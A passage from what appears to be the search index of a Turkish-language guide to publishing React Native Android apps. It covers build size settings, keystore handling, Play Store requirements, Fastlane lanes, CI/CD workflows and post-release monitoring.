<pre><code>https://play.google.com/apps/internaltest/XXXXXXXX\n</code></pre>"},{"location":"android/05-troubleshooting/#app-size-optimization","title":"App Size Optimization","text":"<p>AAB Boyutunu K\u00fc\u00e7\u00fcltme:</p> <pre><code>// android/app/build.gradle\nandroid {\n    buildTypes {\n        release {\n            // R8 full mode (daha agresif)\n            minifyEnabled true\n            shrinkResources true\n\n            // Proguard optimization\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n        }\n    }\n\n    // Unused resources'lar\u0131 kald\u0131r\n    packagingOptions {\n        exclude 'META-INF/*.kotlin_module'\n        exclude '**/kotlin/**'\n        exclude '**/*.txt'\n        exclude '**/*.version'\n        exclude '**/*.properties'\n    }\n}\n</code></pre> <p>Hermes Engine (React Native 0.70+):</p> <pre><code>// android/app/build.gradle\nproject.ext.react = [\n    enableHermes: true  // Varsay\u0131lan olarak true\n]\n</code></pre>"},{"location":"android/05-troubleshooting/#hzl-referans","title":"H\u0131zl\u0131 Referans \ud83d\ude80","text":"Komut A\u00e7\u0131klama <code>./gradlew bundleRelease</code> AAB olu\u015ftur <code>./gradlew assembleRelease</code> APK olu\u015ftur <code>./gradlew clean</code> Cache temizle"},{"location":"android/06-app-transfer/","title":"Uygulama Sat\u0131\u015f\u0131 ve Devir","text":"<p>Boyut Analizi:</p> <pre><code># AAB boyutunu analiz et\nbundletool get-size total \\\n  --bundle=android/app/build/outputs/bundle/release/app-release.aab\n\n# APK boyutunu g\u00f6ster\nls -lh android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/06-app-transfer/#keystore-kayb-durumunda","title":"Keystore Kayb\u0131 Durumunda","text":"<p>E\u011fer keystore'u kaybettiyseniz:</p> <ol> <li>Google Play App Signing aktifse:</li> <li>\u2705 Upload key'i yenileyebilirsiniz</li> <li>Play Console \u2192 Setup \u2192 App signing \u2192 Request upload key reset</li> <li> <p>Google destek ekibi yard\u0131mc\u0131 olur</p> </li> <li> <p>Google Play App Signing aktif de\u011filse:</p> </li> <li>\u274c Uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Yeni bir uygulama olarak yay\u0131nlaman\u0131z gerekir</li> <li>T\u00fcm kullan\u0131c\u0131lar\u0131, yorumlar\u0131, indirmeleri kaybedersiniz</li> </ol> <p>[!CAUTION] Bu y\u00fczden Google Play App Signing MUTLAKA aktif olmal\u0131!</p>"},{"location":"android/06-app-transfer/#store-listing-gereksinimleri","title":"Store Listing Gereksinimleri","text":"<p>Minimum Gereksinimler:</p> <ul> <li>App icon: 512x512px (PNG, 32-bit)</li> <li>Feature graphic: 1024x500px</li> <li>Screenshots: En az 2 adet</li> <li>Phone: 320-3840px (16:9 veya 9:16)</li> <li>7-inch tablet: 1024-7680px</li> <li>10-inch tablet: 1024-7680px</li> </ul> <p>Privacy Policy:</p> <ul> <li>E\u011fer hassas veri topluyorsan\u0131z zorunlu</li> <li>URL olarak sa\u011flanmal\u0131</li> <li>GDPR/KVKK uyumlu olmal\u0131</li> </ul> <p>Content Rating:</p> <ul> <li>IARC anketi doldurulmal\u0131</li> <li>Ya\u015f s\u0131n\u0131r\u0131 belirlenir</li> <li>T\u00fcm \u00fclkeler i\u00e7in ge\u00e7erli</li> </ul>"},{"location":"android/06-app-transfer/#data-safety-form-zorunlu","title":"Data Safety Form (ZORUNLU!)","text":"<p>[!CAUTION] Google Play Console'da \"Data Safety\" formu doldurulmadan release olu\u015fturamazs\u0131n\u0131z!</p> <p>Nas\u0131l Doldurulur:</p> <ol> <li>Play Console \u2192 App content \u2192 Data safety</li> <li>Start \u2192 Anketi doldurun</li> </ol> <p>Dikkat Edilmesi Gerekenler:</p> <ul> <li>Firebase Analytics: Evet, veri topluyoruz</li> <li>AdMob: Evet, reklam ID topluyoruz</li> <li>Crash reporting: Evet, crash logs topluyoruz</li> </ul>"},{"location":"android/06-app-transfer/#api-33-yeni-gereksinimler-android-13","title":"API 33+ Yeni Gereksinimler (Android 13+)","text":"<p>[!IMPORTANT] targetSdkVersion 33+ kullan\u0131yorsan\u0131z yeni zorunluluklar var!</p> <p>1. Notification Permission (ZORUNLU):</p> <pre><code>&lt;!-- android/app/src/main/AndroidManifest.xml --&gt;\n&lt;manifest&gt;\n    &lt;uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/&gt;\n    ...\n&lt;/manifest&gt;\n</code></pre> <p>React Native'de runtime permission:</p> <pre><code>import { PermissionsAndroid, Platform } from \"react-native\";\n\nasync function requestNotificationPermission() {\n  if (Platform.OS === \"android\" &amp;&amp; Platform.Version &gt;= 33) {\n    const granted = await PermissionsAndroid.request(\n      PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,\n    );\n    return granted === PermissionsAndroid.RESULTS.GRANTED;\n  }\n  return true;\n}\n</code></pre> <p>2. Foreground Service Types:</p> <pre><code>&lt;!-- E\u011fer foreground service kullan\u0131yorsan\u0131z --&gt;\n&lt;service\n    android:name=\".MyForegroundService\"\n    android:foregroundServiceType=\"location|camera|microphone\" /&gt;\n</code></pre> <p>[!WARNING] API 33+ i\u00e7in notification permission zorunlu. Eklemezsaniz bildirimler \u00e7al\u0131\u015fmaz!</p>"},{"location":"android/06-app-transfer/#ek-troubleshooting","title":"Ek Troubleshooting \ud83d\udd27","text":""},{"location":"android/06-app-transfer/#assetsgorseller-gorunmuyor","title":"Assets/G\u00f6rseller G\u00f6r\u00fcnm\u00fcyor","text":"<p>Sorun: Release APK'da g\u00f6rseller veya fontlar y\u00fcklenmiyor.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Manuel bundle olu\u015ftur\nnpx react-native bundle \\\n  --platform android \\\n  --dev false \\\n  --entry-file index.js \\\n  --bundle-output android/app/src/main/assets/index.android.bundle \\\n  --assets-dest android/app/src/main/res\n\n# Sonra build\ncd android &amp;&amp; ./gradlew assembleRelease\n</code></pre>"},{"location":"android/06-app-transfer/#install_failed_update_incompatible","title":"INSTALL_FAILED_UPDATE_INCOMPATIBLE","text":"<p>Sorun: Farkl\u0131 imza ile imzalanm\u0131\u015f eski uygulama y\u00fckl\u00fc.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Eski uygulamay\u0131 kald\u0131r\nadb uninstall com.yourapp\n\n# Yeni APK'y\u0131 y\u00fckle\nadb install android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/06-app-transfer/#execution-failed-for-task-appvalidatesigningrelease","title":"Execution failed for task ':app:validateSigningRelease'","text":"<p>Sorun: Keystore bulunam\u0131yor veya \u015fifre yanl\u0131\u015f.</p> <p>Kontrol:</p> <pre><code># Dosya var m\u0131?\nls -la android/app/my-upload-key.keystore\n\n# \u015eifre do\u011fru mu?\nkeytool -list -keystore android/app/my-upload-key.keystore\n\n# gradle.properties do\u011fru mu?\ncat ~/.gradle/gradle.properties\n</code></pre> <p>Yayg\u0131n Hata:</p> <pre><code># \u2705 DO\u011eRU\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\n\n# \u274c YANLI\u015e\nMYAPP_UPLOAD_STORE_FILE=android/app/my-upload-key.keystore\n</code></pre>"},{"location":"android/06-app-transfer/#install_parse_failed_no_certificates","title":"INSTALL_PARSE_FAILED_NO_CERTIFICATES","text":"<p>Sorun: APK imzalanmam\u0131\u015f.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code>apksigner verify --verbose app-release.apk\n</code></pre>"},{"location":"android/07-fastlane-automation/","title":"Fastlane ile Deployment Otomasyonu \ud83e\udd16","text":"<p>Manuel build almak ve Play Console'a dosya s\u00fcr\u00fcklemek yerine, Fastlane kullanarak t\u00fcm s\u00fcreci tek komuta indirebilirsiniz.</p>"},{"location":"android/07-fastlane-automation/#1-kurulum","title":"1. Kurulum","text":"<p>Fastlane, Ruby tabanl\u0131d\u0131r. Projenizin k\u00f6k dizininde (react-native projesi root'u):</p> <pre><code># Gemfile olu\u015ftur\nbundle init\n\n# Gemfile i\u00e7ine ekle:\n# gem \"fastlane\"\n\n# Y\u00fckle\nbundle install\n</code></pre>"},{"location":"android/07-fastlane-automation/#2-fastlane-baslatma","title":"2. Fastlane Ba\u015flatma","text":"<p>Android klas\u00f6r\u00fcne gidin ve init yap\u0131n:</p> <pre><code>cd android\nbundle exec fastlane init\n</code></pre> <p>Size paket ad\u0131n\u0131 soracak ve <code>android/fastlane</code> klas\u00f6r\u00fcn\u00fc olu\u015fturacakt\u0131r.</p>"},{"location":"android/07-fastlane-automation/#3-google-play-api-erisimi-service-account","title":"3. Google Play API Eri\u015fimi (Service Account)","text":"<p>Fastlane'in Google Play'e dosya y\u00fckleyebilmesi i\u00e7in bir Service Account JSON dosyas\u0131na ihtiyac\u0131 var.</p> <ol> <li>Google Cloud Console'u a\u00e7\u0131n.</li> <li>IAM &amp; Admin &gt; Service Accounts &gt; Create Service Account.</li> <li>Role olarak Service Account User verin.</li> <li>Olu\u015fturulan hesaba t\u0131klay\u0131n &gt; Keys &gt; Add Key &gt; Create New Key &gt; JSON.</li> <li>Dosyay\u0131 indirin ve projenizde <code>android/fastlane/api-key.json</code> olarak kaydedin. (Bunu <code>.gitignore</code>'a ekleyin!)</li> <li>Google Play Console &gt; Users and permissions sayfas\u0131ndan bu email adresini davet edin ve Admin (veya Release Manager) yetkisi verin.</li> </ol>"},{"location":"android/07-fastlane-automation/#4-fastfile-konfigurasyonu","title":"4. Fastfile Konfig\u00fcrasyonu","text":"<p><code>android/fastlane/Fastfile</code> dosyas\u0131n\u0131 d\u00fczenleyin:</p> <pre><code>default_platform(:android)\n\nplatform :android do\n  desc \"Build ve Google Play Internal Track'e y\u00fckle\"\n  lane :internal do\n    # 1. Versiyon kodunu art\u0131r (Opsiyonel, plugin gerekir)\n    # increment_version_code(gradle_file_path: \"app/build.gradle\")\n\n    # 2. Temizle\n    gradle(task: \"clean\")\n\n    # 3. Release AAB al\n    gradle(\n      task: \"bundle\",\n      build_type: \"Release\",\n      properties: {\n        \"android.injected.signing.store.file\" =&gt; ENV[\"MYAPP_UPLOAD_STORE_FILE\"],\n        \"android.injected.signing.store.password\" =&gt; ENV[\"MYAPP_UPLOAD_STORE_PASSWORD\"],\n        \"android.injected.signing.key.alias\" =&gt; ENV[\"MYAPP_UPLOAD_KEY_ALIAS\"],\n        \"android.injected.signing.key.password\" =&gt; ENV[\"MYAPP_UPLOAD_KEY_PASSWORD\"],\n      }\n    )\n\n    # 4. Google Play'e y\u00fckle\n    upload_to_play_store(\n      track: \"internal\",\n      aab: \"app/build/outputs/bundle/release/app-release.aab\",\n      json_key: \"fastlane/api-key.json\",\n      skip_upload_metadata: true, # Metadata/screenshot g\u00fcncellemeyecekseniz true yap\u0131n (h\u0131z kazand\u0131r\u0131r)\n      skip_upload_changelogs: true\n    )\n\n    # 5. Slack'e bildirim at (Opsiyonel)\n    # slack(message: \"Android Release ba\u015far\u0131yla y\u00fcklendi! \ud83d\ude80\")\n  end\nend\n</code></pre>"},{"location":"android/07-fastlane-automation/#5-calstrma","title":"5. \u00c7al\u0131\u015ft\u0131rma","text":"<p>Terminalden tek komutla deploy yap\u0131n:</p> <pre><code>cd android\nbundle exec fastlane internal\n</code></pre> <p>[!TIP] Metadata Y\u00f6netimi: Fastlane ile uygulaman\u0131n ba\u015fl\u0131\u011f\u0131n\u0131, a\u00e7\u0131klamas\u0131n\u0131 ve ekran g\u00f6r\u00fcnt\u00fclerini de y\u00f6netebilirsiniz. <code>fastlane supply init</code> komutu ile mevcut Play Store verilerini \u00e7ekebilir, localde d\u00fczenleyip pushlayabilirsiniz.</p>"},{"location":"android/08-ci-cd-pipelines/","title":"CI/CD Pipeline'lar\u0131 \ud83d\udd04","text":"<p>S\u00fcrekli entegrasyon ve da\u011f\u0131t\u0131m (CI/CD), her kod de\u011fi\u015fikli\u011finde testlerin \u00e7al\u0131\u015fmas\u0131n\u0131 ve onaylanan kodun otomatik olarak ma\u011fazaya y\u00fcklenmesini sa\u011flar.</p>"},{"location":"android/08-ci-cd-pipelines/#1-environment-variables-secrets","title":"1. Environment Variables (Secrets)","text":"<p>Pipeline'lar\u0131n\u0131z\u0131n \u00e7al\u0131\u015fmas\u0131 i\u00e7in a\u015fa\u011f\u0131daki de\u011fi\u015fkenleri CI/CD sa\u011flay\u0131c\u0131n\u0131z\u0131n Secrets b\u00f6l\u00fcm\u00fcne eklemelisiniz.</p> Secret Ad\u0131 De\u011fer <code>KEYSTORE_BASE64</code> <code>my-upload-key.keystore</code> dosyas\u0131n\u0131n Base64 hali (<code>base64 -i file.keystore</code>) <code>KEY_ALIAS</code> Keystore alias ad\u0131 <code>KEYSTORE_PASSWORD</code> Keystore \u015fifresi <code>KEY_PASSWORD</code> Key \u015fifresi <code>PLAY_CONFIG_JSON</code> Google Service Account JSON i\u00e7eri\u011fi (Fastlane i\u00e7in)"},{"location":"android/08-ci-cd-pipelines/#2-github-actions-workflow","title":"2. GitHub Actions Workflow","text":"<p><code>.github/workflows/android-deploy.yml</code>:</p> <pre><code>name: Android Deploy\non:\n  push:\n    tags:\n      - \"v*\" # v1.0.0 gibi tag at\u0131ld\u0131\u011f\u0131nda \u00e7al\u0131\u015f\u0131r\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup JDK 17\n        uses: actions/setup-java@v4\n        with:\n          distribution: \"zulu\"\n          java-version: \"17\"\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20\n\n      - name: Install dependencies\n        run: npm ci\n\n      # 1. Keystore Dosyas\u0131n\u0131 Olu\u015ftur\n      - name: Decode Keystore\n        run: |\n          echo \"${{ secrets.KEYSTORE_BASE64 }}\" | base64 -d &gt; android/app/my-upload-key.keystore\n\n      # 2. Fastlane Kurulumu\n      - name: Setup Ruby\n        uses: ruby/setup-ruby@v1\n        with:\n          ruby-version: \"3.0\"\n          bundler-cache: true\n          working-directory: \"android\"\n\n      # 3. Google Play JSON Key Olu\u015ftur\n      - name: Create Google Play JSON\n        run: |\n          echo '${{ secrets.PLAY_CONFIG_JSON }}' &gt; android/fastlane/api-key.json\n\n      # 4. Fastlane ile Deploy\n      - name: Deploy to Play Store Internal\n        run: |\n          cd android\n          bundle exec fastlane internal\n        env:\n          MYAPP_UPLOAD_STORE_FILE: \"my-upload-key.keystore\"\n          MYAPP_UPLOAD_STORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}\n          MYAPP_UPLOAD_KEY_ALIAS: ${{ secrets.KEY_ALIAS }}\n          MYAPP_UPLOAD_KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}\n</code></pre>"},{"location":"android/08-ci-cd-pipelines/#3-gitlab-cicd","title":"3. GitLab CI/CD","text":"<p><code>.gitlab-ci.yml</code>:</p> <pre><code>image: reactnativecommunity/react-native-android:latest\n\nstages:\n  - deploy\n\ndeploy_internal:\n  stage: deploy\n  only:\n    - tags\n  before_script:\n    - npm ci\n    # Keystore Decode\n    - echo $KEYSTORE_BASE64 | base64 -d &gt; android/app/my-upload-key.keystore\n    # Google Play JSON\n    - echo $PLAY_CONFIG_JSON &gt; android/fastlane/api-key.json\n  script:\n    - cd android\n    - bundle install\n    - bundle exec fastlane internal\n  variables:\n    MYAPP_UPLOAD_STORE_FILE: \"my-upload-key.keystore\"\n    # Di\u011fer de\u011fi\u015fkenler GitLab CI/CD Variables sekmesinden gelir\n</code></pre> <p>[!WARNING] G\u00fcvenlik Uyar\u0131s\u0131: Loglarda \u015fifrelerin g\u00f6r\u00fcnmedi\u011finden emin olun. GitHub Actions ve GitLab CI, secret olarak tan\u0131mlanan de\u011fi\u015fkenleri otomatik olarak maskeler (***), ancak <code>echo</code> ile yazd\u0131rmamaya dikkat edin.</p>"},{"location":"android/09-post-release-monitoring/","title":"Release Sonras\u0131 Monitoring \ud83d\udcca","text":"<p>Uygulamay\u0131 yay\u0131nlad\u0131ktan sonra i\u015f bitmez. Kullan\u0131c\u0131lar\u0131n ya\u015fad\u0131\u011f\u0131 \u00e7\u00f6kme (crash) ve performans sorunlar\u0131n\u0131 takip etmeniz gerekir.</p>"},{"location":"android/09-post-release-monitoring/#1-firebase-crashlytics-mapping-files","title":"1. Firebase Crashlytics &amp; Mapping Files","text":"<p>ProGuard/R8 kulland\u0131\u011f\u0131m\u0131z i\u00e7in (<code>minifyEnabled true</code>), hata loglar\u0131 \"obfuscated\" (okunamaz) halde gelir. Yani <code>MainComponent.java line 54</code> yerine <code>a.b.c line 1</code> g\u00f6r\u00fcrs\u00fcn\u00fcz. Bunu d\u00fczeltmek i\u00e7in Mapping File y\u00fcklemelisiniz.</p>"},{"location":"android/09-post-release-monitoring/#gradle-ile-otomatik-yukleme-onerilen","title":"Gradle ile Otomatik Y\u00fckleme (\u00d6nerilen)","text":"<p><code>android/app/build.gradle</code> dosyan\u0131zda Crashlytics plugin'inin kurulu oldu\u011fundan emin olun.</p> <pre><code>// android/build.gradle (Project level)\ndependencies {\n    classpath 'com.google.firebase:firebase-crashlytics-gradle:2.9.9'\n}\n\n// android/app/build.gradle (App level)\napply plugin: 'com.google.firebase.crashlytics'\n</code></pre> <p>Firebase Gradle eklentisi, release build s\u0131ras\u0131nda mapping dosyas\u0131n\u0131 otomatik olarak bulur ve y\u00fckler. Ancak bazen manuel tetiklemek gerekir:</p> <pre><code>./gradlew app:assembleRelease app:uploadCrashlyticsMappingFileRelease\n</code></pre>"},{"location":"android/09-post-release-monitoring/#fastlane-ile-yukleme","title":"Fastlane ile Y\u00fckleme","text":"<p>E\u011fer Fastlane kullan\u0131yorsan\u0131z, <code>Fastfile</code> i\u00e7ine ekleyebilirsiniz:</p> <pre><code>lane :internal do\n  # ... build ad\u0131mlar\u0131 ...\n\n  # AAB y\u00fckleme\n  upload_to_play_store(...)\n\n  # Mapping file y\u00fckleme (Firebase'e)\n  upload_symbols_to_crashlytics(\n    gsp_path: \"app/google-services.json\",\n    binary_path: \"app/build/intermediates/merged_native_libs/release/out/lib\" # NDK kullan\u0131yorsan\u0131z\n  )\nend\n</code></pre>"},{"location":"android/09-post-release-monitoring/#2-google-play-vitals","title":"2. Google Play Vitals","text":"<p>Google Play Console &gt; Quality &gt; Android Vitals sekmesi, uygulaman\u0131z\u0131n sa\u011fl\u0131\u011f\u0131n\u0131 g\u00f6sterir.</p> <p>Takip Etmeniz Gereken Kritik Metrikler:</p> <ol> <li>Crash rate: %1.09'un alt\u0131nda olmal\u0131. (K\u00f6t\u00fc davran\u0131\u015f e\u015fi\u011fi)</li> <li>ANR rate (Application Not Responding): %0.47'nin alt\u0131nda olmal\u0131.</li> </ol> <p>[!TIP] ANR Neden Olur? UI thread'i 5 saniyeden fazla kilitlerseniz ANR hatas\u0131 al\u0131rs\u0131n\u0131z. Genellikle a\u011f\u0131r i\u015flemleri (g\u00f6rsel i\u015fleme, b\u00fcy\u00fck veri d\u00f6ng\u00fcleri) ana thread'de yapmaktan kaynaklan\u0131r.</p>"},{"location":"android/09-post-release-monitoring/#3-performans-izleme-firebase-performance","title":"3. Performans \u0130zleme (Firebase Performance)","text":"<p>Kullan\u0131c\u0131lar\u0131n uygulama a\u00e7\u0131l\u0131\u015f s\u00fcresini ve a\u011f isteklerinin h\u0131z\u0131n\u0131 \u00f6l\u00e7mek i\u00e7in:</p> <pre><code>npm install @react-native-firebase/perf\n</code></pre> <p>JS taraf\u0131nda \u00f6zel trace'ler ekleyebilirsiniz:</p> <pre><code>import perf from \"@react-native-firebase/perf\";\n\nasync function customTrace() {\n  const trace = await perf().startTrace(\"custom_trace\");\n\n  // ... i\u015flemler ...\n\n  await trace.stop();\n}\n</code></pre>"},{"location":"android/10-advanced-practices/","title":"\u0130leri Seviye DevOps Pratikleri \ud83d\ude80","text":"<p>Fastlane ve CI/CD kurulumunu tamamlad\u0131ysan\u0131z, s\u00fcrecinizi bir \u00fcst seviyeye ta\u015f\u0131yacak \"B\u00fcy\u00fcc\u00fcl\u00fck\" seviyesindeki ara\u00e7lar \u015funlard\u0131r.</p>"},{"location":"android/10-advanced-practices/#1-codepush-hot-updates","title":"1. CodePush (Hot Updates) \u26a1\ufe0f","text":"<p>React Native'in en b\u00fcy\u00fck s\u00fcper g\u00fcc\u00fcd\u00fcr. JavaScript ve Asset (resim vb.) de\u011fi\u015fikliklerini, Google Play / App Store incelemesine sokmadan direkt kullan\u0131c\u0131n\u0131n cihaz\u0131na g\u00f6ndermenizi sa\u011flar.</p> <p>Ne Zaman Kullan\u0131l\u0131r?</p> <ul> <li>Kritik bugfix'ler</li> <li>UI/UX d\u00fczeltmeleri</li> <li>Metin g\u00fcncellemeleri</li> </ul> <p>Ne Zaman KULLANILMAZ?</p> <ul> <li>Native kod de\u011fi\u015fikli\u011fi yapt\u0131ysan\u0131z (<code>npm install</code> ile native library eklediyseniz veya <code>android/</code> klas\u00f6r\u00fcnde de\u011fi\u015fiklik yapt\u0131ysan\u0131z). Bu durumda normal Store g\u00fcncellemesi \u015fartt\u0131r.</li> </ul>"},{"location":"android/10-advanced-practices/#kurulum-microsoft-app-center","title":"Kurulum (Microsoft App Center)","text":"<ol> <li><code>npm install react-native-code-push</code></li> <li>App Center hesab\u0131 olu\u015fturun ve uygulama ekleyin.</li> <li><code>App.js</code> dosyan\u0131z\u0131 sar\u0131n:</li> </ol> <pre><code>import codePush from \"react-native-code-push\";\n\nlet codePushOptions = { checkFrequency: codePush.CheckFrequency.ON_APP_RESUME };\n\nclass App extends Component {\n  // ...\n}\n\nexport default codePush(codePushOptions)(App);\n</code></pre>"},{"location":"android/10-advanced-practices/#fastlane-ile-codepush","title":"Fastlane ile CodePush","text":"<p>Fastlane ile CodePush da otomatize edilebilir:</p> <pre><code>lane :hotfix do\n  # JS Bundle'\u0131 App Center'a (CodePush) g\u00f6nder\n  appcenter_codepush_release_react(\n    api_token: \"YOUR_TOKEN\",\n    owner_name: \"YOUR_ORG\",\n    app_name: \"YOUR_APP\",\n    deployment: \"Production\"\n  )\nend\n</code></pre>"},{"location":"android/10-advanced-practices/#2-firebase-app-distribution-hzl-qa","title":"2. Firebase App Distribution (H\u0131zl\u0131 QA) \ud83e\uddea","text":"<p>Google Play Internal Track bazen i\u015flemesi saatler s\u00fcrer. Test ekibine (QA) veya \u015firket i\u00e7i testerlara an\u0131nda (saniyeler i\u00e7inde) APK da\u011f\u0131tmak i\u00e7in Firebase App Distribution en iyi \u00e7\u00f6z\u00fcmd\u00fcr.</p>"},{"location":"android/10-advanced-practices/#avantajlar","title":"Avantajlar\u0131","text":"<ul> <li>\ud83d\ude80 An\u0131nda da\u011f\u0131t\u0131m (Upload biter bitmez bildirim gider)</li> <li>\ud83d\udce9 Testerlara email bildirimi</li> <li>\ud83d\udcca Kim indirdi, kim test etti takibi</li> </ul>"},{"location":"android/10-advanced-practices/#fastlane-entegrasyonu","title":"Fastlane Entegrasyonu","text":"<p>\u00d6nce plugin'i kurun: <code>fastlane add_plugin firebase_app_distribution</code></p> <p><code>Fastfile</code>:</p> <pre><code>lane :beta do\n  # Debug veya Beta build al\n  gradle(task: \"assembleRelease\")\n\n  # Firebase'e y\u00fckle\n  firebase_app_distribution(\n    app: \"1:1234567890:android:xxxxxx\", # Firebase App ID\n    groups: \"qa-team, developers\",       # Tester gruplar\u0131\n    release_notes: \"Yeni login ekran\u0131 d\u00fczeltildi.\"\n  )\nend\n</code></pre>"},{"location":"android/10-advanced-practices/#3-otomatik-ikon-badgeleme","title":"3. Otomatik \u0130kon Badge'leme \ud83c\udff7\ufe0f","text":"<p>Geli\u015ftirme (Dev) veya Beta s\u00fcr\u00fcmlerini, Production s\u00fcr\u00fcm\u00fcnden ay\u0131rmak i\u00e7in ikonlar\u0131n \u00fczerine otomatik \"BETA\" veya versiyon numaras\u0131 basabilirsiniz.</p> <p>Gereksinim: <code>brew install graphicsmagick</code></p> <p>Plugin: <code>fastlane add_plugin badge</code></p> <p><code>Fastfile</code>:</p> <pre><code>lane :beta do\n  # \u0130konun \u00fczerine \"BETA\" ve versiyon \"1.0.3\" yazar\n  add_badge(dark: true)\n\n  gradle(task: \"assembleRelease\")\n\n  # Release sonras\u0131 ikonlar\u0131 temizle (orijinale d\u00f6n)\n  sh \"git checkout -- android/app/src/main/res/mipmap-*\"\nend\n</code></pre> <p>Bu i\u015flem sonucunda testerlar telefonlar\u0131nda uygulaman\u0131n ikonunu \u015f\u00f6yle g\u00f6r\u00fcrler:</p> <p>\ud83d\udcf1 Uygulama \u0130konu + \u00dczerinde \"1.0 BETA\" etiketi.</p>"},{"location":"android/10-advanced-practices/#efsanevi-workflow-ornegi","title":"Efsanevi Workflow \u00d6rne\u011fi \ud83c\udfc6","text":"<p>T\u00fcm bu ara\u00e7lar\u0131 birle\u015ftiren ideal bir workflow \u015f\u00f6yledir:</p> <ol> <li> <p>Kod Pushlan\u0131r (GitHub):</p> <ul> <li>CI Server (GitHub Actions) tetiklenir.</li> <li>Testler (<code>npm test</code>) ko\u015far.</li> </ul> </li> <li> <p>Nightly/Beta Build (Her Gece veya Merge Sonras\u0131):</p> <ul> <li><code>fastlane beta</code> \u00e7al\u0131\u015f\u0131r.</li> <li>Badge: \u0130kona versiyon bas\u0131l\u0131r.</li> <li>Build: APK olu\u015fturulur.</li> <li>Distribution: Firebase App Distribution ile QA ekibine g\u00f6nderilir.</li> </ul> </li> <li> <p>Production Release (Tag at\u0131ld\u0131\u011f\u0131nda):</p> <ul> <li><code>fastlane production</code> \u00e7al\u0131\u015f\u0131r.</li> <li>Build: AAB olu\u015fturulur (badgesiz, temiz ikon).</li> <li>Upload: Google Play Console (Internal Track) y\u00fcklenir.</li> <li>Notify: Slack'ten \"Yay\u0131na haz\u0131r!\" mesaj\u0131 at\u0131l\u0131r.</li> </ul> </li> <li> <p>Hotfix (Acil Durum):</p> <ul> <li><code>fastlane hotfix</code> \u00e7al\u0131\u015f\u0131r.</li> <li>CodePush ile JS bundle g\u00fcncellenir.</li> <li>Kullan\u0131c\u0131lar uygulamay\u0131 kapat\u0131p a\u00e7t\u0131\u011f\u0131nda g\u00fcncellemeyi al\u0131r.</li> </ul> </li> </ol>"},{"location":"android/keystore/","title":"Android Keystore ve APK \u0130mzalama Rehberi","text":"<p>[!WARNING] Gizli D\u00f6k\u00fcman: Bu sayfa navigasyonda g\u00f6r\u00fcnmez. Sadece do\u011frudan URL ile eri\u015filebilir.</p> <p>G\u00fcvenlik Uyar\u0131s\u0131: Keystore dosyas\u0131 ve \u015fifreleri asla Git'e commit etmeyin!</p> <p>React Native Android uygulaman\u0131z\u0131 Google Play Store'a y\u00fcklemek i\u00e7in APK/AAB dosyas\u0131n\u0131 imzalaman\u0131z gerekir. Bu rehber t\u00fcm s\u00fcreci ad\u0131m ad\u0131m anlat\u0131r.</p>"},{"location":"android/keystore/#keystore-nedir","title":"Keystore Nedir? \ud83d\udd11","text":"<p>Keystore, Android uygulaman\u0131z\u0131 imzalamak i\u00e7in kullan\u0131lan dijital sertifika deposudur.</p> <p>\u00d6nemli Noktalar:</p> <ul> <li>Her uygulama benzersiz bir keystore ile imzalanmal\u0131d\u0131r</li> <li>Keystore kaybedilirse, uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Google Play, ayn\u0131 keystore ile imzalanm\u0131\u015f APK'lar\u0131 ayn\u0131 uygulama olarak tan\u0131r</li> <li>Keystore \u015fifresini unutmay\u0131n - kurtarma yolu yoktur!</li> </ul>"},{"location":"android/keystore/#tek-keystore-vs-coklu-keystore-cok-onemli","title":"Tek Keystore vs \u00c7oklu Keystore (\u00c7ok \u00d6nemli!) \ud83c\udfaf","text":"<p>[!CAUTION] Birden fazla uygulama geli\u015ftiriyorsan\u0131z:</p> <p>\u274c YANLI\u015e: T\u00fcm uygulamalar i\u00e7in ayn\u0131 keystore \u2705 DO\u011eRU: Her uygulama i\u00e7in ayr\u0131 keystore</p> <p>Neden Her Uygulama \u0130\u00e7in Ayr\u0131 Keystore?</p> Senaryo Tek Keystore \u00c7oklu Keystore G\u00fcvenlik \u274c Bir keystore s\u0131zarsa t\u00fcm uygulamalar risk alt\u0131nda \u2705 Sadece 1 uygulama etkilenir Uygulama Sat\u0131\u015f\u0131 \u274c Keystore'u payla\u015fmak zorunda kal\u0131rs\u0131n \u2705 Sadece o uygulaman\u0131n keystore'unu verirsin Organizasyon \u274c Hangi keystore hangi app'e ait belli de\u011fil \u2705 Her keystore a\u00e7\u0131k\u00e7a etiketli Keystore Kayb\u0131 \u274c T\u00fcm uygulamalar g\u00fcncelleme alamaz \u2705 Sadece 1 uygulama etkilenir <p>\u00d6nerilen \u0130simlendirme:</p> <pre><code># \u274c YANLI\u015e (genel isim)\nmy-upload-key.keystore\n\n# \u2705 DO\u011eRU (uygulama \u00f6zel)\nexpense-tracker-upload-key.keystore\ntodo-app-upload-key.keystore\nfitness-app-upload-key.keystore\n</code></pre> <p>Dosya Yap\u0131s\u0131 \u00d6rne\u011fi:</p> <pre><code>~/keystores/\n\u251c\u2500\u2500 expense-tracker/\n\u2502   \u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt  (\u015fifreler, alias)\n\u251c\u2500\u2500 todo-app/\n\u2502   \u251c\u2500\u2500 todo-app-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt\n\u2514\u2500\u2500 fitness-app/\n    \u251c\u2500\u2500 fitness-app-upload-key.keystore\n    \u2514\u2500\u2500 keystore-info.txt\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Her uygulama i\u00e7in ayr\u0131 klas\u00f6r</li> <li>Keystore ad\u0131nda uygulama ad\u0131 olsun</li> <li>\u015eifreleri 